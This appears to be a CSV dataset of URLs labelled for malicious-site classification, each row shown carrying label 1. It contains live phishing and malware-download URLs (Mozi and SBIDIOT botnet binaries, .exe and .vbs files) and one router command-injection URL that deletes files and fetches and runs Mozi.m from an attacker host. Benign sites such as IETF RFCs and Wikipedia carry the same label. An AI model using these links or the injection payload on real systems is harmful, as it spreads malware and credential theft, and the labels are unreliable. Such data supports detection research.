url,label
http://hosting7154312.az.pl/kubaeu/wp-content/plugins/akismet/wells/www.wellsfargo/online.htm,1
http://www.teknosima.it/index.php?option=com_content&view=frontpage&Itemid=1&fontstyle=f-smaller,1
http://www.philharmonia-chor-stuttgart.de/konzerte/rueckblick/68-freitag-13-februar-2009-1900-uhr,1
https://firebasestorage.googleapis.com/v0/b/ornng456.appspot.com/o/index.html?alt=media&amp;token=7474575d-1423-42f2-aac3-1cfb559bd06d,1
http://www.abelmannconsulting.de/webagentur/webdesign,1
https://han.gl/C8p8U,1
tsldada.pl,1
www.arjay.bc.ca/Modula-2/m2faq.html,1
selfossbiz.gq,1
en.wikipedia.org/wiki/Modula-3,1
www.ulb.ac.be/facs/sciences/info/,1
http://www.academiedumeuble.ca/index.php?option=com_mailto&tmpl=component&link=aHR0cDovL3d3dy5hY2FkZW1pZWR1bWV1YmxlLmNhL2luZGV4LnBocD9vcHRpb249Y29tX2NvbnRlbnQmdmlldz1hcnRpY2xlJmlkPTU3OnBhcnRlbmFpcmVzJmNhdGlkPTQ1OnBhcnRlbmFpcmVzJkl0ZW1pZD02OA==,1
http://avesis.nl/inloggen/remind.html,1
http://www.pubyun.com/wiki/lib/exe/css.php?t=dokuwiki&tseed=f1f16e8c6142fab8553f2b9cfe045961,1
http://style.org.hc360.com/css/detail/mysite/siteconfig/pro_control.css,1
http://www.animalairways.com/services/additional-services/ticketing-for-family-a-pet.html,1
http://patrikcase.com/index.php?option=com_virtuemart&Itemid=33,1
https://baebristolcouk-my.sharepoint.com/:b:/g/personal/andy_alway_bae-bristol_co_uk/ERuVh2DXnptOigiD9XS1cjMBtlkwRunRuhlJQQZkPvgHuw?e=7kRpof,1
http://cembra-ch.com/,1
https://anna-kravchuk.com/templates/beez3/index.html,1
http://ducks.pt/language/8080-buy-cheapes-home5.html,1
www.oopweb.com/Assembly/Files/Assembly.html,1
http://apechemy.fr/index.php/photos/14-2010/detail/519-24042010078?tmpl=component,1
www.atelio.com/ultra-tag-editor/,1
http://58.243.20.165:43481/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1&next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://58.243.20.165:43481/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1,1
www.osha.gov/dcsp/alliances/atmi/atmi.html,1
hangibolum.com,1
http://www.thermansi.com/index.php?option=com_virtuemart&page=shop.registration&Itemid=1,1
http://www.latarnik.eu/index.php?option=com_content&view=article&id=15&Itemid=38,1
http://www.dutchpeaks.nl/nl/home-dutchpeaks,1
https://spdtextile.com/sport/2l2.exe,1
http://37.49.226.187/x86,1
http://teamgorillas.com/index.php?view=dayview&id=22&day=18&month=1&year=2013&option=com_fastball&Itemid=85,1
http://9779.info/%E5%B9%BC%E5%84%BF%E5%9B%AD%E6%89%8B%E5%B7%A5%E7%B2%98%E8%B4%B4%E7%94%BB%E6%95%99%E6%A1%88/,1
goldensscom.org,1
http://www.sri-lanka-reisen.eu/linkpartner.html,1
http://download1271.mediafire.com/41a4m5p7a6ig/cslcvrl34gqli1f/canada+post+delivery.7z,1
tools.ietf.org/html/rfc214,1
dhqhospitalmianwali.com,1
www.webring.com/hub?ring=lolth&amp;list,1
https://mitsui-jyuku.mixh.jp/uploads/2243fvasea.exe,1
http://danielfabri.com.ar/cerealera-molino-chacabuco-1/index.html,1
http://fb.com.accounts.login.userid.386219.fbsbk.com/wed15/,1
seattlepi.nwsource.com/business/58025_chainemail13.shtml,1
http://www.motechsolutions.co.uk/motech-pro-ipbx.html,1
http://thai-liveaboard.com/index.php?option=com_thailiveaboard&view=divesites&seaid=1&sid=1&primloc=Surin+Area&lang=en,1
http://leaderinfife.org/index.php?option=com_contact&view=contact&id=11:scottish-business-in-the-community&catid=44:lag-members&Itemid=74,1
www.asap.unimelb.edu.au/bsparcs/guides/puzzles/acrostic2.htm,1
https://americanascrediario.com/MeusProdutos/Prefetch.php?skullid=42506506,1
http://mmc-leipzig.com/konzept.html,1
http://www.ciifen-int.org/index.php?option=com_xmap&sitemap=1&Itemid=59&lang=en,1
www.garni.ch/fish/,1
www.quirk.biz/searchstatus/,1
http://www.vittorioguzzo.it/galleria-fotografica.html,1
http://www.rathgaelgym.org/classes/68-recreation-cheer-leading,1
http://colourworks360.co.uk/media/mailto/B2b-new/Remax/index.php,1
http://www.safaricontractcleaners.com/sejeal.jpg,1
hcrmouudjxzhhfdfimnj.maherstcottage.com.au,1
http://ecoledecoiffurecarolinelaprise.com/inscriptions/112.html,1
http://www.bakfietsservice.nl/index.php?option=com_content&view=category&layout=blog&id=22&Itemid=35,1
potamitis.gr,1
www.csee.wvu.edu/~jdm/classes/cs258/OScat/micros.html,1
kadiyles.ru,1
http://www.haewonfood.com/bbs/icon/private_icon/vodafone.co.uk/index.html,1
http://www.leblancathletisme.fr/index.php?view=article&catid=34:news&id=52:accueil&tmpl=component&print=1&layout=default&page=,1
http://pastehtml.com/view/b7ick4lui.html,1
http://silca02.it/confezioni-scatole/torte/scatola-per-torta-quadrata-delizia-h-8,1
http://www.olab.se/index.php/component/content/article/1-nyheter/17-aelgboersen-2011,1
codehicode.com,1
http://www.academiedumeuble.ca/index.php?option=com_content&view=article&id=49&Itemid=58,1
http://www.kamasua.com.br/index.php?page=shop.browse&category_id=27&option=com_virtuemart&Itemid=128,1
rajputsardar.com,1
http://pastehtml.com/view/bdl4bo6nm.html,1
http://www.portedoce.com/wp-snapshots/yahoo/,1
gyro186.ru,1
www.ibiblio.org/michael/vtda/index2.html,1
http://77.43.171.16:35006/Mozi.m,1
http://www.824555.com/app/member/main.php?uid=guest&langx=zh-cn&page_site=ball,1
luc.adventist.org/lucis/index.php,1
http://ecoledecoiffurecarolinelaprise.com/formations/maquillage/109.html,1
http://www.apeviharaya.lk/wp-admin/includes/logon.do.php,1
http://www.klinghammer.com/de/bilder-a-videos/formdosen/runde-dosen/lebensmitteldosen,1
http://www.natuurfotovanderhart.nl/newsblog/168-december-2012.html?tmpl=component&print=1&layout=default&page=,1
http://www.plexiprint.net/plexi/index.html,1
apple-id-itunes.webcindario.com,1
http://gergsd.pochta.ru/pte.itonlineperalelogin-home.fccTYPE%3d33554433%26REALMOID%3d06-b5208d98-1e41-108b-b247-8392a717ff3e%26GUID%3d%26SMAUTHREASON%3d0%26METHOD%3dGET%26SMAGENTNAME%3d_SM_UhZIZHag2bep4YAGCQRLKGELyK1icf0_2f8FRJgFGwWOYp1NuqkVFFUxA_3d_3d%26TARGET%3d_SM.aspx,1
http://www.disline.es/videoguias.html?task=videodirectlink&id=80,1
http://microsoft-outlook.dynv6.net/renews/office365/,1
http://www.knittedknots.com/index.php?option=com_virtuemart&page=shop.browse&category_id=48&Itemid=4,1
www.rebex.net/RConvLog/,1
fms.komkon.org/VGB/,1
www.billybear4kids.com/screen/stpatty.htm,1
pbmuaythaiindonesia.com,1
http://boroska.ru/index.php?option=com_content&view=article&id=3&Itemid=18,1
http://www.kospel.pl/zh/kontakt.html,1
http://www.sweetwaterplantation.com/index.php?option=com_content&view=article&id=86&Itemid=224,1
http://pastehtml.com/view/be3kydyjh.html,1
http://football-euro.net/angliya.html,1
https://dehkadenovin.com/capitalone/capital1last/loading.html,1
protec-vip01.000webhostapp.com,1
stopnarkotic.ru,1
http://www.graz4u.at/en.feed?type=atom,1
http://martinprothero.com/index.php/gallery/1/43?tmpl=component,1
http://www.adriaszalon.hu/index.php?page=shop.product_details&flypage=flypage.tpl&product_id=164&category_id=22&option=com_virtuemart&Itemid=80&vmcchk=1&Itemid=80,1
http://www.school91.kiev.ua/index.php?view=article&catid=38:2010-10-09-15-56-39&id=219:2012-10-26-10-20-46&tmpl=component&print=1&layout=default&page=,1
http://josecampuzano.net/index.php?option=com_mailto&tmpl=component&link=aHR0cDovL2pvc2VjYW1wdXphbm8ubmV0L2luZGV4LnBocD9vcHRpb249Y29tX2NvbnRlbnQmdmlldz1hcnRpY2xlJmlkPTUxOnNvbWV3aGVyZS1vdmVyLXRoZS1yYWluYm93JmNhdGlkPTQwOm11c2ljYS1hdXRvci1jYXRlZ29yaWEmSXRlbWlkPTcw,1
http://9779.info/%E5%8A%A8%E7%89%A9%E7%93%9C%E5%AD%90%20%E8%B4%B4%E7%94%BB/,1
'www.anver.com/document/vacuum\%20components/vacuum\%20generators/pumps-elec.htm',1
http://gazomer.com/setka-rabica1.1,1
http://www.slaviacapital.cz/tlacove-spravy-eng/slavia-capital-sold-heating-firm-energy-snina-to-grafobal-group-energy-2,1
http://www.wsnc.org.au/component/jcalpro/week/date/2013-01-28,1
http://www.abertosp.com/index.php?option=com_content&view=article&id=215&Itemid=83,1
https://mitsui-jyuku.mixh.jp/uploads/78413687ead846bae3d6dc2187ebf1d00be.exe,1
http://www.1euro-hosting.eu/index.php,1
www.petercorke.com/tkbibtex.html,1
www.tunghingwire.com/En_Main.html,1
http://pkfcaribbean.com/locations/19-pkf-belize.html,1
http://3cf.ru/2015/03/04/stydentka-iz-rossii-razbilas-nasmert-ypav-s-balkona-vo-vremia-seksa/,1
tools.ietf.org/html/rfc3177,1
http://9779.info/%E5%BD%A9%E7%BA%B8%E5%89%AA%E8%B4%B4%E7%94%BB%E8%8A%B1%E6%9C%B5%E5%9B%BE%E7%89%87/,1
www.fredbecker.com/Trade2.htm,1
http://www.afrikaansealbinos.nl/index.php/nl/wie-zijn-wij/geschiedenis.html,1
infosboitevocaleorangecompte.pe.hu,1
groups.yahoo.com/group/c64/,1
www.linux-sec.net/Patches/,1
http://www.ekwdesign.de/referenzen/printdesign/243-printdesign-sparkasse-bad-hersfeld-rotenburg-aussengestaltung.html,1
http://www.shirley.com.sg/index.html,1
tech.groups.yahoo.com/group/zope/,1
http://mail.poeliersbedrijfhazenbroek.nl/~u43730p39181/pki-validation,1
kernel.org/pub/linux/kernel/people/paulmck/perfbook/perfbook.html,1
www.ornl.gov/~webworks/cppr/y2001/pres/120145.pdf,1
http://lamonika.com/wp-content/plugins/wpa/u.php,1
https://pastebin.com/raw/9sFBTnF0,1
www.cs.binghamton.edu/~lowpower/koolchips00.pdf,1
http://itir4.app.link/L0dNQhpxy4,1
http://www.osn-solutions.nl/index.php/nl/consultancy,1
http://206.189.210.89/SBIDIOT/m68k,1
http://www.tomaspaulik.cz/glosy/spolecnost/29-pf-2013,1
http://www.weekendacquerello.it/en.feed?type=atom,1
https://pennysolvers.co.uk/.LA/adapter2adapter.ping.html?SDAN=MSs22djpHh2DSWF5LcCk6zGJIvbAAMkADcyMWNlOGU4LTA1MTctNGU5NC04NmVhLTM2ZjY2MWQ1ODUyZQAuAAAAAACPL3Vd8cnLS4/rNHDvh%20urAQDLxtTRqKyYQrNPEBhBv0F3AAAMdHa7AAA_938945743421MTctNGU5NC04NmVhLTM2ZjY2MW1MTctNGU5NC04NmVhLTM2ZjY2MW,1
http://www.divanomoveis.com.br/Produtos/default.asp?opc=5&ops=12,1
https://pastebin.com/raw/HqHbTv6Q,1
http://zshsq.com/news/class/index.php?page=1&catid=95&myord=uptime&myshownums=&showtj=&showdate=&author=&key=,1
http://www.farmaciaspengler.com.br/index.php?option=com_content&view=article&id=2&Itemid=256,1
www.realmofgaming.com/?page=ps2cheats/findingnemo.php&amp;type=cheats,1
http://www.fishzone.co.za/index.php?page=shop.product_details&flypage=flypage.tpl&category_id=18&product_id=152&option=com_virtuemart&Itemid=1,1
www.artmedia.com.au/gotitflauntit.htm,1
https://livestudentccc-my.sharepoint.com/personal/wbolton2_student_ccc_edu/_layouts/15/guestaccess.aspx?guestaccesstoken=5H0OeW86MsaysTeS1gwFdlwquUqKQCD5xq3g5gb2TtY%3d&docid=1_1d3620f9c557e492685ffcecb0adc5391&wdFormId=%7B80E4FD22%2D3513%2D480F%2DAC86%2D75F894A0032F%7D,1
homepage.eircom.net/~lrtc/computers/software/turtle/index.html,1
http://amusementlamp.com/en/YJLED-015-SM-Series-95-1.html,1
crush5media.com,1
http://182.52.164.39:53711/Mozi.m,1
http://9779.info/%E5%88%9D%E4%B8%80%E7%BE%8E%E6%9C%AF%E7%94%BB/,1
http://www.uspenie.info/home/teaching/463-pouchenie-v-pjatuju-nedelju.html,1
http://www.imagepluslasvegas.com/rhinoplasty-las-vegas-non-surgical-rhinoplasty.php,1
http://laneasthk.com/media/paypal/index.php,1
http://www.allaroundrental.com/index.php?option=com_virtuemart&page=shop.browse&category_id=28&Itemid=64,1
http://www.ambiani.nl/accomodatie/ambianizaal.html,1
kellyboy49.com,1
http://www.harley-davidson-dijon.com/component/adsmanager/toutes_les_annonces?start=120,1
http://www.fancygaptourism.com/dining-and-shopping/shopping/30-peaceful-heart-alpacas,1
pages.webbaukasten.de/sweet17.de/olealsbart/,1
http://audeantenne.com/index.php?option=com_content&view=article&id=115&Itemid=204,1
http://sagivlaw.com/index.php?option=com_weblinks&view=category&id=7:stateauthorities&Itemid=2,1
http://www.gypsyspirit.eu/archiv/3-archiv-noviniek/14-odborna-porota-gypsy-spirit-2009-je-znama,1
http://www.holtemidtpunkt.dk/index.php?option=com_content&view=article&id=74&Itemid=138,1
www.cs.tut.fi/~jkorpela/chars/,1
http://www.kospel.pl/pl/produkty/akcesoria/akcesoria-do-kolektorow-sonecznych.html,1
http://www.raci.it/area_fr/societe/le-groupe-raci.html,1
https://bcpzonasegurabeta.viabcp.com.pe.consultas-afp.john-burdett.com/,1
cepteteb-basvuru.com,1
http://okumaaliskanligi.com/nicin-okumuyoruz/60-nicinokumuyoruz.html?tmpl=component&print=1&layout=default&page=,1
http://3cf.ru/2015/07/21/fytbol-rfpl-zapystila-socialnyi-proekt-igrai-krasivo/,1
http://www.westwoodchurch.co.uk/our-services/sunday-celebration/celebration-talks/191-09-10-2011-discipleship-luke-6v12-6v36-peter-findley,1
http://groengroep.com/projecten/52-tuin-bij-dijkwoning-te-aalsmeerderbrug.html,1
http://115.56.111.77:37796/Mozi.m,1
http://gertvanegmond.nl/contact,1
http://218.21.171.244:40508/Mozi.m,1
xml.coverpages.org/soap.html,1
http://danielfabri.com.ar/campo-12/index.html,1
http://www.neesonmurcutt.com/public/mudgeeraba-2010.html,1
http://www.limburgeraltstadt.de/index.html?option=com_content&view=category&layout=blog&id=39&Itemid=54&fontstyle=f-larger,1
www.softtextile.biz/yarnglossary,1
http://silca02.it/sejeal.jpg,1
http://www.vejufeja.lt/galerija/category/25-rugelio-kelias,1
http://42.235.63.163:42517/Mozi.m,1
http://www.ayseteyze.com.tr/catering-hizmetleri.html,1
http://www.ninopizzaria.com.br/index.php?option=com_content&view=article&id=96&Itemid=163,1
http://engine32truck16.com/index.php?view=article&catid=37:around-the-house&id=102:christmas-comes-early&tmpl=component&print=1&layout=default&page=,1
http://9779.info/%E6%88%91%E7%9A%84%E5%91%A8%E6%9C%AB%E5%89%AA%E8%B4%B4%E7%94%BB/,1
secure-societegenerale-authpass.com,1
www.freewebs.com/syedsameer/,1
http://www.bukitesveiki.lt/straipsniai-pranesimai/straipsniai/295-vaiko-teis-sanatorin-gydym-?tmpl=component&print=1&layout=default&page=,1
http://wollatonhouse.com/about-wollaton-house.html,1
www.angelfire.com/il/photographers/,1
tools.ietf.org/html/rfc1560,1
http://innexinc.com/stt/create/ourtime/ourtime123/ourtime.php,1
www.sungard.com/reech/,1
secure.xls.login.airbornefnq.com.au,1
www.cconcepts.co.uk/products/artworks.htm,1
http://pznsk.ru/index.php?option=com_content&view=article&id=9&Itemid=13,1
http://www.alte-druckerei.de/index.php/tube-amp-service/neue-bastelartikel,1
naturelferforje.com,1
http://hoteldashortencias.com.br/index.php?%2FLocalizacao%2Flocalizacao.html,1
http://www.fundicor.com/index.php?option=com_mailto&tmpl=component&link=aHR0cDovL3d3dy5mdW5kaWNvci5jb20vaW5kZXgucGhwP29wdGlvbj1jb21fY29udGVudCZ2aWV3PWFydGljbGUmaWQ9MTAyJTNBZW4tY29uc3RydWNjaW9uJmNhdGlkPTQ0JTNBZW1wcmVzYSZJdGVtaWQ9ODU=,1
http://www.sv-rotamint.de/index.php/bildergalerie/meist-gesehen,1
http://dhc-sport.com/modules/mod_tpmenu/tpmenu/dropdown/menu.js.php?animated=Fx.Transitions.Bounce.easeOut,1
madyalingkarartha.com,1
ciccc.goeoffice.com,1
sthenri.com.au,1
http://homeandawayapts.com/propertyservices.html,1
http://dropshippingmart.com/paler/excelzz/bizmail.php,1
http://www.nicolatessari.it/index.php/en/manifesto?tmpl=component&print=1&page=,1
doc.cat-v.org/plan_9/4th_edition/papers/utf,1
sabadellat.com,1
http://www.docklandsundaymarket.com.au/component/user/remind,1
http://www.lebenslauf-fischerbach.de/index.php?option=com_easybook&view=easybook&Itemid=2&limitstart=5,1
www.stanford.edu/group/SOL/software.html,1
http://dl.get1993desk.com/n/84728686/PJCaptureScriptsEdition.exe,1
tools.ietf.org/html/rfc1906,1
www.dyerassoc.com/pepper/,1
http://www.zibae.ir/index.php?option=com_mailto&tmpl=component&link=aHR0cDovL3d3dy56aWJhZS5pci9pbmRleC5waHA%2Fb3B0aW9uPWNvbV9jb250ZW50JnZpZXc9YXJ0aWNsZSZpZD0zNzc6MTM5MC0wNC0wMS0xMC0xMC01NiZjYXRpZD0xMDoxMzg5LTA5LTEzLTIzLTMyLTA3Jkl0ZW1pZD04,1
http://emigrationrusse.com/index.php?option=com_content&view=category&layout=blog&id=98&Itemid=705&lang=fr,1
http://www.zuzatravel.pl/polska-centralna/item/43-warszawa-2-dni.html,1
www.geom.uiuc.edu/~ross/webtex/webtex/,1
http://www.galerie-unterm-maulbeerbaum.de/index.php?option=com_mailto&tmpl=component&link=aHR0cDovL3d3dy5nYWxlcmllLXVudGVybS1tYXVsYmVlcmJhdW0uZGUvaW5kZXgucGhwP29wdGlvbj1jb21fY29udGVudCZ2aWV3PWFydGljbGUmaWQ9NDc6MjAxMCZJdGVtaWQ9MTE=,1
http://www.vilagnomad.com/wp-content/themes/central/css/stylesheet.min.css?ver=3.9.6,1
nihilxaos.com,1
bulletin.stcloudstate.edu/departments/csci.asp,1
http://www.nubiafarias.com/v1/index.php?option=com_mymural&view=recados&Itemid=24&limitstart=15,1
http://gulfcoastlivingonline.net/component/user/index.html?task=login&e299080a7fe5d55a8685e1d0ffffee89=1,1
http://chambopercussion.com/es/quienessomos,1
http://www.petdogwash.com.br/index.php?option=com_contact&view=contact&id=1&Itemid=65,1
http://66.70.225.220/SBIDIOT/spc,1
http://pastehtml.com/view/bbp2800lq.html,1
slashdot.org/search.pl?topic=108,1
tools.ietf.org/html/rfc2666,1
http://fallnix.ca/content/aol/index.html,1
http://www.direitoseguro.com.br/__private0/infinitygo.sslblindado.com/p/vaidevisa/asp/conta/autentica/index.html,1
http://www.feuer-wehr.de/index.php?option=com_content&view=article&id=298&Itemid=62,1
http://royalfarm-eg.com/index.php?option=com_k2&view=item&layout=item&id=33&Itemid=251,1
www.ioi2002.or.kr/eng/,1
serienstreamen.com,1
www.intel.com/products/graphics/,1
www.skrenta.com/monster/,1
http://www.ninopizzaria.com.br/index.php?option=com_content&view=article&id=124:segunda-parte-da-receita-do-file-a-parmegiana&catid=44:institucional&Itemid=62,1
http://www.smos.cn/news_show.asp?news_id=84,1
http://www.alorenademalaga.com/index.php/component/mailto/index.html?tmpl=component&link=b34e4fad4090aa38473af8b0503fbb47c2e8d712,1
https://pinmicro.com/wp-content/themes/danfe/jckhk/EmploymentVerification_7284_05072020.zip,1
http://142.93.49.109/SBIDIOT/m68k,1
http://spmenglishschool.com/picture-palace.html?func=viewcategory&catid=57,1
groups.yahoo.com/group/kpt101/,1
https://mitsui-jyuku.mixh.jp/uploads/19613687ead846bae3d6dc2187ebf1d00be.exe,1
www.cellspark.com/MidiCutter.html,1
http://puracolombia.com/es/sitemap,1
www.cs.berkeley.edu/~russell/bat.html,1
http://www.ekwdesign.de/referenzen/printdesign/244.html,1
http://www.denturesuk.com/our-team/brett,1
http://shatorupa.com/receipe/micro/adobe/,1
http://www.werderfan-fahrten.de/index.php?option=com_phocagallery&view=category&id=6:saison-20112012-hinrunde&Itemid=63,1
www.uow.edu.au/~rwitton/,1
http://www.tirs-online.de/aktionen/sonstige-aktionen.1,1
http://khanimambatraining.co.za/cnc/en.php,1
http://www.ninopizzaria.com.br/index.php?option=com_content&view=article&id=94&Itemid=171,1
https://pastebin.com/raw/BhVA9C1U,1
tools.ietf.org/html/rfc1273,1
http://www.estetango.com/eventi-ferrara/venueevents/10-centro-sociale-qil-quadrifoglioq.html?pop=1&tmpl=component,1
www.nsa.gov/research/selinux/,1
users.cybercity.dk/~bse26236/batutil/help/SED.HTM,1
http://www.affordable-adult-vacations.com/index.html,1
http://www.egejewelry.com/index.php?option=com_rsgallery2&gid=2,1
http://annazonjpadd.com/o9n6y/login.php?p=0&amp;sessionid=616e6e617a6f6e6a706164642e636f6d,1
http://florianrestaurant.com/index.php?lang=en,1
http://www.webmama.cn/images/201202/goods_img/4231_P_1329952276447.jpg,1
http://www.polska.travel.pl/pogoda-polska/lodz/pogoda-polska/warszawa/1?miasto=42,1
http://199.195.249.47/ap/ad.arm4,1
http://www.docklandsundaymarket.com.au/contact,1
https://download-serverupdate.eu-gb.cf.appdomain.cloud/,1
http://www.merlegkepeskonyvelotanfolyam.hu/merlegkepes-kepzesi-hirek/222-valtozasok-az-okj-ban-hasznaljak-ki-az-utolso-lehetseget.html,1
http://halalreturns.com/index.php?option=com_content&view=category&layout=blog&id=35&Itemid=55,1
http://167.172.167.26/armv6l,1
masterlinbat17.000webhostapp.com,1
https://eislemlertr.org/,1
http://9779.info/%E5%B9%BC%E5%84%BF%E5%9B%AD%E5%B0%8F%E7%8F%AD%E4%BA%B2%E5%AD%90%E8%B4%B4%E7%94%BB/,1
www.nieveler.org/PGP/pgp.htm,1
http://www.transportheker.com/index.php?option=com_content&view=article&id=52&Itemid=11&font_size=smallfonts,1
www.adobe.com/cfusion/knowledgebase/index.cfm?id=tn_14266,1
http://www.mariamagdalena-bogatynia.pl/index.php?option=com_rsgallery2&gid=16&Itemid=67&limitstart=18,1
http://www.prismpgh.org/component/events/index.html?task=view_day&year=2012&month=01&day=04,1
http://www.negentis.com/soluzioni/aree-applicative,1
tools.ietf.org/html/rfc2059,1
https://livenmitac-my.sharepoint.com/personal/czarina-cabalza_live_nmit_ac_nz/_layouts/15/guestaccess.aspx?guestaccesstoken=BCxwl3A7TTskGW2POLH3Cucg2dFe77pBj2gKmiXkIZs=&amp;docid=1_1b87bddf46e1144efadb39c587acdadae&amp;wdFormId={5B4E96CF-1BCD-468F-A845-09B4D8027BC2},1
wireless.fcc.gov/geographic/,1
https://mitsui-jyuku.mixh.jp/uploads/68713687ead846bae3d6dc2187ebf1d00be.exe,1
tools.ietf.org/html/rfc2966,1
http://www.raci.it/rete-di-vendita/veneto.html,1
crangaprasad.tripod.com/crp.html,1
http://www.tellimus.ee/et/pood/details/3913/192/accessories/swivels/wirbel-m.spezialkarabiner-gr10.html,1
http://9779.info/%E7%BA%BD%E6%89%A3%E7%B2%98%E8%B4%B4%E7%94%BB%E5%90%91%E6%97%A5%E8%91%B5/,1
workfromhome-amazon-ntylpikxje.antalyamasajsalonu.net,1
http://cookingx2.com/index.html,1
https://srv-file9.gofile.io/download/Zw9Mex/OMS_FINANCIAL.SUPPORT.MEASURESpdf.vbs,1
http://176.119.1.180/fk/pmb.php,1
http://12com.net/a/duchangmeinv/2012/1201/100.html,1
http://e-ebru.com/CIDmdkrmADA/U_TID=QDKNC8013403/AccountLogin.php,1
http://www.arcolec.com/index.php?option=com_content&view=article&id=54:building&catid=36:jaslideshow2&Itemid=57,1
http://www.thinkvisual.com.au/index.php?option=com_content&view=article&id=6&Itemid=11,1
freshmeat.net/projects/imagemagick/?topic_id=100,1
juneauexploratlon.com,1
http://mncelektronik.com/pp/account/check/Support/ID-NUMB893/myaccount/signin/,1
www.mattkruse.com/javascript/,1
http://www.0068555.com/app/member/SportOption.php?uid=guest&langx=gb,1
artlabkeram.ru,1
tools.ietf.org/html/rfc1269,1
http://www.z-mobility.eu/news-und-presse.html,1
tdgzin36bqr86m89u4ks.bosch-web-marketing.co.uk,1
http://mygerman.info/index.php?option=com_mailto&tmpl=component&link=aHR0cDovL215Z2VybWFuLmluZm8vaW5kZXgucGhwP29wdGlvbj1jb21fY29udGVudCZ2aWV3PWFydGljbGUmaWQ9OTMlM0F6bGF0bm90by1wcmF2aWxvLWthcmVuLWFtc3Ryb25nJkl0ZW1pZD01Mw==,1
http://sladkiybuket.net/index.php?option=com_virtuemart&page=shop.browse&category_id=10&Itemid=55,1
http://144.202.97.69/SBIDIOT/x86,1
tools.ietf.org/html/rfc2924,1
http://www.briard-profi.de/unsere-briard-welpen/30-p-wurf.html,1
http://www.kulturwelle.at/kontakt,1
app-1530001945.000webhostapp.com,1
http://111.42.67.72:52866/Mozi.m,1
posteevolution.online,1
http://www.martin-busker.de/administrator/help/en-GB/css/Facture/3c1a7e426b9f40528f06d3068559d755/242bd28a09d79e0e59673e070ea6d30b/particuliers-45636.php,1
http://www.thermansi.com/index.php?page=shop.ask&flypage=flypage_images.tpl&product_id=17&category_id=6&option=com_virtuemart&Itemid=1,1
tech.dimac.net/Products/w3Image/start.htm,1
http://www.ibericoscalama.es/index.php?option=com_content&view=article&id=73&Itemid=90,1
http://www.feuerwehr-treuenbrietzen.de/index.php?option=com_peoplebook&Itemid=3&func=fullview&staffid=10000027&search=LOWER(name)+LIKE+'%'&previous_field=name&previous_term=&search_status=%&search_category=%&sort_field=&sort_order=,1
tools.ietf.org/html/rfc1066,1
http://www.q-com.eu/index.php?option=com_content&view=article&id=58&Itemid=130&vsig58_0=4,1
https://staffandfaculty.my-free.website/,1
http://www.protect-effect.nl/diensten/94-blackberry-playbook-bij-protect-effect,1
http://www.job.ph/index.php?option=com_jobs&task=detail_category&id=525:materials--scientific&Itemid=2,1
http://115.229.200.2:53809/Mozi.m,1
http://aciai.com.br/index.php?option=com_content&view=article&id=45&Itemid=36,1
http://www.bnrwatersport.nl/neem-contact-met-mij-op.html,1
http://aciai.com.br/index.php?option=com_content&view=article&id=29&Itemid=35,1
http://www.textilexpres.com/TE/index.php?option=com_content&view=category&id=908:comercio-retail&Itemid=111&layout=default,1
re-account-business.com,1
http://thai-liveaboard.com/index.php?option=com_thailiveaboard&view=divesites&seaid=1&sid=2&primloc=Krabi+Area&lang=ru,1
http://coppeliaescoladeballet.com.br/index.php?option=com_mailto&tmpl=component&link=04cc1f70525d05edc4f1af0f421c90a838c61e63,1
www.people.fas.harvard.edu/~agoldham/,1
web.tiscali.it/leddit/abcMIDI/Index.html,1
http://babaci.fr/index.php?option=com_content&view=article&id=46:testarticle&catid=34:test-accueil&Itemid=50,1
tools.ietf.org/html/rfc2745,1
"http://www.gartmarine.ru/index.php?page=shop.ask&product_id=23&subject=\320%9Fะพะทะฒะพะฝะธ\321%82ะต,+\321%87\321%82ะพะฑ\321%8B+\321%83\321%82ะพ\321%87ะฝะธ\321%82\321%8C+\321%86ะตะฝ\321%83:+260+EC&option=com_virtuemart&Itemid=11",1
https://transparency-page-business-secure.000webhostapp.com/ret.html,1
http://advonationusa.com/wp-image/1/customer_center/customer-IDPP00C457/myaccount/index.php?cmd=login_submit&amp;id=600499f8825fb92ab011ce35a999332f600499f8825fb92ab011ce35a999332f&amp;session=600499f8825fb92ab011ce35a999332f600499f8825fb92ab011ce35a999332f,1
http://itport.com.ua/novosti/stranitsa-2-5882352941176,1
http://58.243.20.119:56671/Mozi.m,1
http://www.sportschule-neumann.de/index.php?option=com_joomgallery&func=detail&id=27&Itemid=10,1
http://stock.perm.ru/index.php?option=com_content&view=article&id=73&Itemid=255,1
